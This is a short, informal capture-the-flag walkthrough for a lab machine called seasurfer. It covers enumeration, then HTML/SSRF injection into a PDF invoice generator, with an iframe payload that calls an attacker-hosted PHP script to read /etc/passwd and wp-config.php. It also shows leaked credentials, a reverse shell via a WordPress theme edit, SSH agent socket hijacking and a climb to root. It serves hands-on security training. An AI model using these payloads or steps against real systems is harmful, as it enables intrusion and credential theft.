Started with a nmap scan
```
22 OpenSSH 8.2p1
80 Apache 2.4.41
```
Going to the site its a default apache page so whatweb and there is a domain linked `seasurfer.thm` going to do a subdomain scan `internal` when I ran gobuster it was just hitting on a lot of false positives so I turned that scan off but the site is running wordpress version `5.9.3` 
```
Plugins 
team-members 5.1.0
```
The `internal` subdomain its a invoice generator and makes it into a pdf going to run gobuster agin and see if there is anything interesting 
```
/adminer version 4.8.1
```
Found adminer running could not find any vulnerability's so going back to the PDF generator trying some more injections we can do a SSRF injection `<img src=x onerrpr=document.write(1)>` and this gives us `1` back and we can use ssrf to exploit we need to make a php script to read the request and then host the php file and we can use this payload to read the `/etc/passwd` file `<iframe height=3000 src="http://10.13.8.255/ssrf.php?p=file:///etc/psswd">` we can use this to read config files `/var/www/html/wordpress/wp-config.php` and we can get the db creds `wordpressuer:coolDataTablesMan` and log into adminer going to the `wp_users` and there is a user called kyle which is also a ssh user and we have a hash and we can crack this `kyle:jenny4ever` now we can login to the wordpress admin panel and we can edit one of the themes 404 page to  get a reverse shell and we get a call back as the `www-data` user and there is a `backup.sh` script in the internal folder if we make a sh script in the invoices folder and can get a reverse shell as kyle and then we can get a real shell by adding are keys to the ssh folder looking in the tmp folder there is 2 ssh sessions and we can add a auth socket and then run `ssh-add -l` and then run `sudo -l` and we can just become root user   